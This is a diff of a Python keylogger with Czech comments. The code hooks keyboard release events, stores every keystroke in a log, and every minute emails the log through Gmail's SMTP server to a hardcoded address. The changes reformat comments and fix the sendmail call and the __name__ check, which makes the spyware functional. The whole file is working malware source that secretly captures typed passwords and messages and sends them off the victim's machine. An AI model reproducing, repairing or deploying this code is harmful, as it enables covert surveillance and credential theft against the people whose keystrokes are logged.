@@ -1,6 +1,9 @@
-import keyboard                                 #pro keylogy
-import smtplib                                  #nacteni knihovny pro odesilani emailu prostrednictvim SMTP protokolu (gmail)
-from threading import Semaphore,Timer           #Semaphore blokuje aktuální vlakna, Timerem vytvořím intervaly, ve kterých se data budou posílat na mail
+import keyboard
+#pro keylogy
+import smtplib
+#nacteni knihovny pro odesilani emailu prostrednictvim SMTP protokolu (gmail)
+from threading import Semaphore,Timer
+#Semaphore blokuje aktuální vlakna, Timerem vytvořím intervaly, ve kterých se data budou posílat na mail
 
 POSLI_REPORT_KAZDYCH = 60      #1 minuta
 Email_adresa = "klogger1661@gmail.com"
@@ -18,25 +21,31 @@ class Keylogger:
         if len(nazev) > 1:
             #tady jeste neresim specialni znaky (ctrl, alt, shift atd.)
             if nazev == "space":
-                                                                    # " " namisto "space"
+                # " " namisto "space"
                 nazev = " "
             elif nazev == "enter":
-                                                                    #prida novy radek pokazde, kdyz se zmackne enter
+                # prida novy radek pokazde, kdyz se zmackne enter
                 nazev = "[ENTER]\n"
             elif nazev == "decimalni":
                 nazev = "."
             else:
-                #mezery nahradime podtrzitkama
+                # mezery nahradime podtrzitkama
                 nazev = nazev.replace(" ","_")
                 nazev = f"[{nazev.upper()}]"
-        self.log += nazev                                           #pokazde kdyz se pusti nejaka klavesa, tak se stisknute tlacitko ulozi do self.log jako string
+        self.log += nazev
+            #pokazde kdyz se pusti nejaka klavesa, tak se stisknute tlacitko ulozi do self.log jako string
 
     def odeslimail(self,email,heslo,zprava):
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)      #nastavime pripojeni k SMTP serveru
-        server.starttls()                                           #pripojime se na SMTP server v TLS modu (z duvodu bezpecnosti)
-        server.login(email,heslo)                                   #prihlaseni do mailu
-        server.odeslimail(email,heslo,zprava)                       #odeslani dat
-        server.quit()                                               #ukoncim relaci
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+            #nastavime pripojeni k SMTP serveru
+        server.starttls()
+            #pripojime se na SMTP server v TLS modu (z duvodu bezpecnosti)
+        server.login(email,heslo)
+            #prihlaseni do mailu
+        server.sendmail(email,heslo,zprava)
+            #odeslani dat
+        server.quit()
+            #ukoncim relaci
 
     def report(self):
         #funkce mi zabezpeci to, ze se mail bude odesilat jen v nami stanovenem intervalu
@@ -48,13 +57,13 @@ class Keylogger:
         Timer(interval=self.interval,function=self.report).start()
 
     def start(self):
-        #start samotneho keyloggeru
+            #start samotneho keyloggeru
         keyboard.on_release(callback = self.callback)
-        #zacnu reportovat keylogy
+            #zacnu reportovat keylogy
         self.report()
-        #blokuje aktualni vlakno (protoze pusteni ji uz neblokuje -> pusteni spustilo listener v dalsim vlaknu
+            #blokuje aktualni vlakno (protoze pusteni ji uz neblokuje -> pusteni spustilo listener v dalsim vlaknu
         self.semaphore.acquire()
 
-if __nazev__ == "__main__":
+if __name__ == "__main__":
     keylogger = Keylogger(interval=POSLI_REPORT_KAZDYCH)
     keylogger.start()
